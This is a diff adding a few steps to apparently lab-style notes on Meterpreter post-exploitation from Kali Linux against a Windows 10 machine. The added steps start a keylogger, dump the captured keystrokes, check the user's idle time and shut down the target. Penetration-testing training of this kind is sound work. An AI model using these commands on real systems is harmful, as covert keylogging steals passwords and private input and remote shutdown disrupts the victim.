@@ -202,8 +202,19 @@ To view the mace attributes of passwords.txt, type:
 Locating files with Search
 > search -f pagefile.sys
 
+Log all the Key strokes
+meterpreter > keyscan_start
 
+~~~Switch to the Windows 10, create a text file and type something:
 
+~~~Switch back to the Kali Linux and dump the captured Keystrokes, by typing:
+> keyscan_dump
+
+You can see the number of seconds for which the user has been idle on the remote system, by typing:
+> idletime
+
+You may shut down the target machine after performing post exploitation, by typing:
+> shutdown
 
 
 ------------------------------------------------------------------END-------------------------------------------------------------
